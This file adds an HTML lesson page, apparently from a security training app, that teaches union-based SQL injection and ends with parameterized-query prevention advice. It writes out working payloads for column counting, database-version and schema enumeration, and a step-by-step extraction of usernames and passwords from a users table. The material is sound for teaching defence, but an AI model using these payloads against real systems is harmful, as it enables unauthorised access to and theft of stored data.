@@ -1,0 +1,361 @@
+<div class="lesson-view-content">
+  <h1>Union-Based SQL Injection</h1>
+
+  <div class="definition-box">
+    <h2>What is Union-Based SQL Injection?</h2>
+    <p>
+      Union-based SQL injection is a technique that leverages the SQL UNION
+      operator to combine the results of two or more SELECT statements into a
+      single result set. This type of injection allows attackers to extract data
+      from different database tables by appending their own SELECT query to the
+      original query. It is one of the most powerful forms of SQL injection
+      because it enables direct extraction of data from the database.
+    </p>
+  </div>
+
+  <h2>How Union-Based Injection Works</h2>
+  <p>For a successful UNION-based attack, several conditions must be met:</p>
+  <ol>
+    <li>The original query must be a SELECT statement</li>
+    <li>
+      The attacker must determine the number of columns in the original query
+    </li>
+    <li>
+      The data types in the injected query must be compatible with the original
+      query
+    </li>
+    <li>The application must display the results of the query to the user</li>
+  </ol>
+
+  <div class="example-box">
+    <h3>Basic UNION Attack Syntax:</h3>
+    <p>Original query:</p>
+    <p>
+      <code
+        >SELECT name, description FROM products WHERE category =
+        'Electronics'</code
+      >
+    </p>
+    <p>Injected query:</p>
+    <p>
+      <code>Electronics' UNION SELECT username, password FROM users--</code>
+    </p>
+    <p>Resulting query:</p>
+    <p>
+      <code
+        >SELECT name, description FROM products WHERE category = 'Electronics'
+        UNION SELECT username, password FROM users--'</code
+      >
+    </p>
+    <p>
+      This combines product information with user credentials in the results.
+    </p>
+  </div>
+
+  <h2>Steps in a Union-Based Attack</h2>
+  <p>A methodical approach to union-based SQL injection involves:</p>
+  <ol>
+    <li>
+      <strong>Detecting the vulnerability</strong> - Confirm SQL injection is
+      possible
+    </li>
+    <li>
+      <strong>Finding the number of columns</strong> - Determine column count
+      using ORDER BY or UNION attempts
+    </li>
+    <li>
+      <strong>Identifying injectable columns</strong> - Determine which columns
+      can display results
+    </li>
+    <li>
+      <strong>Extracting data</strong> - Use UNION to retrieve information from
+      other tables
+    </li>
+    <li>
+      <strong>Exploring the database</strong> - Extract schema information,
+      table names, and column names
+    </li>
+  </ol>
+
+  <div class="danger-box">
+    <h3>Severity of UNION Attacks</h3>
+    <p>
+      Union-based attacks are particularly dangerous because they allow direct
+      data extraction from any accessible table in the database. An attacker can
+      systematically harvest sensitive information including passwords, personal
+      data, credit card information, and application secrets in a relatively
+      short time.
+    </p>
+  </div>
+
+  <h2>Determining Column Count</h2>
+  <p>
+    Before executing a UNION attack, attackers must identify the number of
+    columns in the original query using either:
+  </p>
+
+  <h3>Method 1: ORDER BY Technique</h3>
+  <p>Testing with increasingly higher column numbers until an error occurs:</p>
+  <ul>
+    <li><code>id=1 ORDER BY 1--</code> (works)</li>
+    <li><code>id=1 ORDER BY 2--</code> (works)</li>
+    <li><code>id=1 ORDER BY 3--</code> (works)</li>
+    <li>
+      <code>id=1 ORDER BY 4--</code> (error → original query has 3 columns)
+    </li>
+  </ul>
+
+  <h3>Method 2: UNION SELECT Technique</h3>
+  <p>Testing with NULL values until finding the correct column count:</p>
+  <ul>
+    <li>
+      <code>id=1 UNION SELECT NULL--</code> (error → wrong number of columns)
+    </li>
+    <li>
+      <code>id=1 UNION SELECT NULL,NULL--</code> (error → wrong number of
+      columns)
+    </li>
+    <li>
+      <code>id=1 UNION SELECT NULL,NULL,NULL--</code> (works → query has 3
+      columns)
+    </li>
+  </ul>
+
+  <div class="example-box">
+    <h3>Column Count Example:</h3>
+    <p>Assuming a vulnerable product search:</p>
+    <p><code>https://example.com/products?category=Electronics</code></p>
+    <p>Testing the column count with:</p>
+    <p>
+      <code
+        >https://example.com/products?category=Electronics' UNION SELECT
+        NULL,NULL,NULL--</code
+      >
+    </p>
+    <p>
+      If successful, this confirms a 3-column result set is returned by the
+      original query.
+    </p>
+  </div>
+
+  <h2>Finding Injectable Columns</h2>
+  <p>
+    After determining the column count, the next step is to identify which
+    columns can display string data:
+  </p>
+  <ol>
+    <li>Replace NULL values with string literals one by one</li>
+    <li>Look for columns where the string appears in the response</li>
+    <li>These columns can be used to extract data</li>
+  </ol>
+
+  <p><strong>Example:</strong></p>
+  <p><code>id=1 UNION SELECT 'a',NULL,NULL--</code></p>
+  <p><code>id=1 UNION SELECT NULL,'a',NULL--</code></p>
+  <p><code>id=1 UNION SELECT NULL,NULL,'a'--</code></p>
+
+  <div class="example-box">
+    <h3>Testing Injectable Columns:</h3>
+    <p>For a 3-column query:</p>
+    <p>
+      <code
+        >https://example.com/products?category=Electronics' UNION SELECT
+        'TESTSTRING',NULL,NULL--</code
+      >
+    </p>
+    <p>
+      If "TESTSTRING" appears in the output, column 1 can be used to extract
+      data.
+    </p>
+    <p>Repeat for each column to identify all injectable positions.</p>
+  </div>
+
+  <h2>Extracting Database Information</h2>
+  <p>
+    Once the column count and injectable columns are known, attackers can
+    extract various information:
+  </p>
+
+  <h3>1. Database Version and Type</h3>
+  <p>Different databases have different version functions:</p>
+  <ul>
+    <li>MySQL/MariaDB: <code>id=1 UNION SELECT @@version,NULL,NULL--</code></li>
+    <li>SQL Server: <code>id=1 UNION SELECT @@version,NULL,NULL--</code></li>
+    <li>
+      Oracle: <code>id=1 UNION SELECT banner,NULL,NULL FROM v$version--</code>
+    </li>
+    <li>PostgreSQL: <code>id=1 UNION SELECT version(),NULL,NULL--</code></li>
+  </ul>
+
+  <h3>2. Database Schema Information</h3>
+  <p>Finding table names (examples for different databases):</p>
+  <ul>
+    <li>
+      MySQL:
+      <code
+        >id=1 UNION SELECT table_name,NULL,NULL FROM
+        information_schema.tables--</code
+      >
+    </li>
+    <li>
+      SQL Server:
+      <code
+        >id=1 UNION SELECT table_name,NULL,NULL FROM
+        information_schema.tables--</code
+      >
+    </li>
+    <li>
+      Oracle:
+      <code>id=1 UNION SELECT table_name,NULL,NULL FROM all_tables--</code>
+    </li>
+    <li>
+      PostgreSQL:
+      <code
+        >id=1 UNION SELECT table_name,NULL,NULL FROM
+        information_schema.tables--</code
+      >
+    </li>
+  </ul>
+
+  <div class="danger-box">
+    <h3>Information Disclosure</h3>
+    <p>
+      Metadata tables like information_schema provide complete maps of the
+      database structure. With this information, an attacker can systematically
+      extract all data from all tables, often including authentication
+      credentials, personal data, financial information, and other sensitive
+      content.
+    </p>
+  </div>
+
+  <h2>Extracting Specific Data</h2>
+  <p>
+    After identifying table and column names, an attacker can extract specific
+    data:
+  </p>
+  <ol>
+    <li>Find table names from schema tables</li>
+    <li>Find column names for interesting tables</li>
+    <li>Extract data from those columns</li>
+  </ol>
+
+  <div class="example-box">
+    <h3>Complete Attack Example:</h3>
+    <p>1. Find column count:</p>
+    <p><code>category=Electronics' ORDER BY 3--</code> (works, so 3 columns)</p>
+    <p>2. Identify injectable columns:</p>
+    <p>
+      <code>category=Electronics' UNION SELECT 'test1','test2','test3'--</code>
+    </p>
+    <p>3. Get table names:</p>
+    <p>
+      <code
+        >category=Electronics' UNION SELECT table_name,NULL,NULL FROM
+        information_schema.tables WHERE table_schema='public'--</code
+      >
+    </p>
+    <p>4. Get column names (assuming 'users' table was found):</p>
+    <p>
+      <code
+        >category=Electronics' UNION SELECT column_name,NULL,NULL FROM
+        information_schema.columns WHERE table_name='users'--</code
+      >
+    </p>
+    <p>5. Extract user data:</p>
+    <p>
+      <code
+        >category=Electronics' UNION SELECT username,password,email FROM
+        users--</code
+      >
+    </p>
+  </div>
+
+  <h2>Advanced UNION Techniques</h2>
+  <p>
+    Experienced attackers use additional techniques for more efficient
+    extraction:
+  </p>
+  <ul>
+    <li>
+      <strong>String concatenation</strong> - Combining multiple columns into
+      one output column
+    </li>
+    <li>
+      <strong>Conditional responses</strong> - Using CASE statements to control
+      output
+    </li>
+    <li>
+      <strong>Subqueries</strong> - Nesting queries for more complex data
+      extraction
+    </li>
+    <li>
+      <strong>LIMIT and OFFSET</strong> - Pagination through large datasets
+    </li>
+  </ul>
+
+  <p><strong>Example of concatenation:</strong></p>
+  <p>
+    MySQL:
+    <code
+      >UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--</code
+    >
+  </p>
+  <p>
+    SQL Server:
+    <code>UNION SELECT username+':'+password,NULL,NULL FROM users--</code>
+  </p>
+
+  <h2>Prevention Techniques</h2>
+  <p>To prevent UNION-based SQL injection:</p>
+  <ol>
+    <li>
+      <strong>Use Parameterized Queries</strong> - Never concatenate user input
+      into SQL strings
+    </li>
+    <li>
+      <strong>Apply Input Validation</strong> - Validate and sanitize all user
+      inputs
+    </li>
+    <li>
+      <strong>Implement Least Privilege</strong> - Restrict database user
+      permissions
+    </li>
+    <li>
+      <strong>Use ORMs</strong> - Leverage frameworks that handle SQL safely
+    </li>
+    <li>
+      <strong>Enable WAF Protection</strong> - Web Application Firewalls can
+      block obvious attacks
+    </li>
+  </ol>
+
+  <div class="example-box">
+    <h3>Prevention Example:</h3>
+    <p>Instead of vulnerable code:</p>
+    <p>
+      <code>
+        String query = "SELECT * FROM products WHERE category = '" +
+        request.getParameter("category") + "'";
+      </code>
+    </p>
+    <p>Use parameterized queries:</p>
+    <p>
+      <code>
+        PreparedStatement stmt = conn.prepareStatement("SELECT * FROM products
+        WHERE category = ?");<br />
+        stmt.setString(1, request.getParameter("category"));<br />
+        ResultSet results = stmt.executeQuery();
+      </code>
+    </p>
+  </div>
+
+  <div class="danger-box">
+    <h3>No Filtering as Defense</h3>
+    <p>
+      Never rely on filtering or escaping characters as your primary defense
+      against SQL injection. Attackers have numerous techniques to bypass these
+      filters. Parameterized queries or prepared statements are the only
+      reliable way to prevent SQL injection vulnerabilities.
+    </p>
+  </div>
+</div>
